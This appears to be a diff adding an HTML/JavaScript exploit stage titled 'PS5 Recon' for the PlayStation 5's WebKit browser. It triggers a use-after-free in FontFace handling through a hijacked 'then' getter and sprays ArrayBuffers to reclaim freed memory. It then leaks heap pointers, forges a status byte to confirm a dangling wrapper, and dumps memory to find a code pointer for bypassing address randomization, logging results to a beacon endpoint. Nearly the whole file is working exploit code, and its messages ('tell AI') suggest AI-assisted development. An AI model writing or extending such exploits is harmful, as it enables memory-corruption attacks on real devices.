@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>PS5 Recon</title>
+<style>
+:root{--bg:#070a0f;--panel:#111722;--line:#1e2838;--txt:#cfe0f2;--dim:#6b7c94;--green:#39d98a;--red:#ff5d6c;--amber:#ffcf6b;--cyan:#53d0e8;--mag:#ff6fd0}
+*{margin:0;padding:0;box-sizing:border-box}
+html,body{background:var(--bg);color:var(--txt);font:13px/1.5 ui-monospace,Menlo,Consolas,monospace}
+#bn{position:fixed;top:0;left:0;right:0;z-index:99;font:800 17px/1.3 ui-monospace,monospace;padding:15px 12px;text-align:center;color:#fff;background:#1b2330;border-bottom:3px solid #2a3647}
+#sub{position:fixed;top:68px;left:0;right:0;z-index:98;font:600 11px ui-monospace,monospace;padding:6px 12px;text-align:center;color:var(--dim);background:#0d131c;border-bottom:1px solid var(--line)}
+#log{margin:100px 10px 10px;padding:10px;background:var(--panel);border:1px solid var(--line);border-radius:8px;max-height:74vh;overflow:auto}
+.r{padding:2px 5px;white-space:pre-wrap;word-break:break-all;border-left:3px solid transparent}
+.r .t{color:var(--cyan);font-weight:700}.r .n{color:var(--dim);font-weight:700}
+.r.ok{border-left-color:var(--green);background:#0c1f16}.r.ok .t{color:var(--green)}
+.r.bad{border-left-color:var(--red);background:#1c0f12}.r.bad .t{color:var(--red)}
+.r.warn .t{color:var(--amber)}
+.r.win{border-left-color:var(--mag);background:#1e0f1b}.r.win .t{color:var(--mag);font-weight:800}
+</style></head>
+<body>
+<div id="bn">starting…</div>
+<div id="sub">P1316 — dangling wrapper lf1: trigger CSSFontFace ops → dump buffer → hunt a WebKit .text/code pointer</div>
+<div id="log"></div>
+<script>
+'use strict';
+window.PTAG='P1316';
+var LOG=document.getElementById('log'),BN=document.getElementById('bn');
+var _ctr=0;
+function S(x,c){BN.textContent=x;BN.style.background=c||'#1b2330';}
+function cls(s){var z=(''+s).toLowerCase();
+  if(/win|code-ptr|candidate|dangling-ok/.test(z))return 'win';
+  if(/hit|ok\b|loaded/.test(z))return 'ok';
+  if(/err|fail|crash|fatal|miss|nospray|cap|no-w/.test(z))return 'bad';
+  if(/stale|none|retry/.test(z))return 'warn';return '';}
+function row(t,d,c){_ctr++;var r=document.createElement('div');r.className='r '+(c||'');
+  r.innerHTML="<span class='n'>"+_ctr+"</span>  <span class='t'>"+String(t).replace(/[<>&]/g,'')+"</span>"+(d?"  <span>"+String(d).replace(/[<>&]/g,'')+"</span>":"");
+  LOG.appendChild(r);LOG.scrollTop=LOG.scrollHeight;}
+function B(tag,data){
+  var c=cls(tag+' '+(data||''));row(tag,data,c);
+  try{var s=String(data||'').replace(/[^A-Za-z0-9._-]/g,'_').slice(0,700);
+    var u='/beacon.php?tag=P1316-'+encodeURIComponent(tag);
+    if(data)u+='&data='+encodeURIComponent(s);
+    u+='&t='+Date.now();
+    var x=new XMLHttpRequest();x.open('GET',u,false);x.send(null);}catch(e){}
+}
+window.onerror=function(m,s,l){B('ERR',(''+m).slice(0,80)+'@'+l);};
+
+(function(){var id='';var cs='ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';for(var i=0;i<6;i++)id+=cs[Math.floor(Math.random()*cs.length)];B('VER-1','');B('BOOT',id);})();
+
+function le(u,o){var x=0n;for(var q=7;q>=0;q--)x=(x<<8n)|BigInt(u[o+q]);return x;}
+
+var leaked={L1:null,L2:null,buf:null,W:null};
+window.__lf=null;
+
+var RC=0;try{RC=parseInt(sessionStorage.getItem('p1316_rc')||'0',10)||0;}catch(e){}
+function reloadOnce(){
+  if(leaked.buf)return;
+  if(RC>=3){B('NOLEAK-CAP','3 misses this open — CLOSE+REOPEN');S('no leak x3 — close+reopen the browser','#4a2a12');return;}
+  try{sessionStorage.setItem('p1316_rc',String(RC+1));}catch(e){}
+  setTimeout(function(){location.reload();},400);
+}
+
+/* ═══ STAGE 1 — proven leak + capture lf1 (dangling wrapper) ═══ */
+var K=32,SIZE=192,fired=false;
+S('STAGE 1 — proven leak + capture lf1…','#13233a');
+window.__sp=[];
+var fs=null;
+try{
+  var vf=new FontFace('vf','local(Helvetica)',{unicodeRange:'U+0041'});
+  document.fonts.add(vf); void vf.loaded;
+  fs=document.createElement('style');
+  fs.textContent='@font-face{font-family:v1;src:local(Arial);unicode-range:U+0042;}';
+  document.head.appendChild(fs);
+}catch(e){B('S1-SETUP-ERR',(''+e).slice(0,50));}
+Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+  get:function(){
+    if(fired)return undefined;fired=true;
+    try{if(fs){fs.textContent='';fs.remove();}}catch(e){}
+    try{document.fonts.delete(this);}catch(e){}
+    fs=null;
+    try{document.body.offsetHeight;}catch(e){}
+    for(var k=0;k<K;k++){
+      var w=new Uint8Array(new ArrayBuffer(SIZE));
+      w[0x82]=3;w[0]=0;w[1]=0;w[2]=0;w[3]=0x80;
+      var mj=0x1000+k;w[4]=mj&0xFF;w[5]=(mj>>8)&0xFF;w[6]=0;w[7]=0;
+      window.__sp.push(w);
+    }
+    return undefined;
+  },set:function(){}});
+B('S1-SETUP','armed');
+try{
+  document.fonts.load('1em vf, v1','AB').then(
+    function(faces){window.__lf=faces;B('S1-RES','n'+(faces&&faces.length));setTimeout(leScan,80);},
+    function(e){B('S1-RJ',''+(e&&e.name));setTimeout(leScan,80);});
+}catch(e){B('S1-LOADERR',(''+e).slice(0,40));}
+setTimeout(function(){ if(leaked.buf)return; if(!window.__sp||!window.__sp.length){B('S1-NOSPRAY','getter never fired');reloadOnce();} },1500);
+setTimeout(function(){ if(!leaked.buf){leScan();} },700);
+
+function leScan(){
+  if(leaked.buf)return;
+  var sp=window.__sp||[],hit=-1;
+  for(var i=0;i<sp.length;i++){var a=le(sp[i],0x58);if(a>0x1000000000n&&a<0x8000000000n){leaked.L1=a;leaked.L2=le(sp[i],0x68);leaked.buf=sp[i];hit=i;break;}}
+  if(hit<0){B('S1-MISS','no reclaim');reloadOnce();return;}
+  B('S1-HIT','L1=0x'+leaked.L1.toString(16)+' L2=0x'+leaked.L2.toString(16)+' k'+hit);
+  /* confirm lf1 is the dangling wrapper */
+  leaked.W=(window.__lf&&window.__lf.length>1)?window.__lf[1]:((window.__lf&&window.__lf[0])||null);
+  if(!leaked.W){B('S1-NO-W','no lf1 wrapper captured');S('no wrapper — tell AI','#4a2a12');finish();return;}
+  var b0;try{b0=''+leaked.W.status;}catch(e){b0='ERR';}
+  leaked.buf[0x82]=4;var b1;try{b1=''+leaked.W.status;}catch(e){b1='ERR';}
+  leaked.buf[0x82]=3;
+  B('S1-DANGLE-CHK','base='+b0+' forged4='+b1+(b1==='error'?' DANGLING-OK':' (not lf1? trying anyway)'));
+  S('LEAK+WRAPPER OK — hunting code ptr…','#0c7a3a');
+  setTimeout(hunt,150);
+}
+
+/* ═══ STAGE 2 — dump buffer, trigger ops, classify every qword ═══ */
+function classify(off,v){
+  if(v===0n)return null;
+  if(off===0)return 'marker';
+  if(v>=0x1000000000n&&v<0x9000000000n)return 'heap';
+  if(v<0x100000n)return 'small';
+  if(v>=0xffffff00000000n)return 'sentinel';
+  return 'CODE?'; /* non-heap, non-small pointer-shaped → candidate module/.text ptr */
+}
+function dumpAll(label){
+  var buf=leaked.buf,parts=[],cand=[];
+  for(var off=0;off<0xC0;off+=8){
+    var v=le(buf,off);var c=classify(off,v);
+    if(c){parts.push('0x'+off.toString(16)+'='+'0x'+v.toString(16)+'['+c+']');if(c==='CODE?')cand.push(off);}
+  }
+  B('DUMP-'+label,parts.join(' '));
+  for(var i=0;i<cand.length;i++){
+    B('CODE-PTR','WIN '+label+' @0x'+cand[i].toString(16)+' = 0x'+le(buf,cand[i]).toString(16)+' — non-heap pointer (module/.text candidate!)');
+    S('CODE POINTER LEAKED !!! tell AI','#0a7a2a');
+  }
+}
+function hunt(){
+  if(window.__h)return;window.__h=true;
+  S('STAGE 2 — dump + trigger','#13233a');
+  var W=leaked.W;
+  dumpAll('PRE');
+  /* T1: re-add to the set (may re-init / register, touch segmented face) */
+  try{document.fonts.add(W);B('T-add','ok');}catch(e){B('T-add-ERR',(''+e).slice(0,40));}
+  dumpAll('POST-add');
+  /* T2: load() — pump sources, may start m_timeoutTimer (vtable @ 0x90) */
+  try{var p=W.load();if(p&&p.then)p.then(function(){},function(){});B('T-load','ok');}catch(e){B('T-load-ERR',(''+e).slice(0,40));}
+  dumpAll('POST-load');
+  /* T3: touch loaded promise (status machinery) */
+  try{void W.loaded;B('T-loaded','ok');}catch(e){B('T-loaded-ERR',(''+e).slice(0,40));}
+  /* T4: force style + layout using the family (cascade may build FontRanges / segmented face) */
+  try{var d=document.createElement('div');d.style.cssText='font-family:v1,serif;position:absolute;left:-9999px';d.textContent='AB';document.body.appendChild(d);void d.offsetWidth;B('T-layout','w='+d.offsetWidth);}catch(e){B('T-layout-ERR',(''+e).slice(0,40));}
+  setTimeout(function(){ dumpAll('POST-all'); finish(); },250);
+}
+function finish(){
+  if(window.__fin)return;window.__fin=true;
+  B('DONE','p1316');
+  S('P1316 COMPLETE — press the run button, I\'ll aggregate','#1b2330');
+}
+</script>
+</body></html>
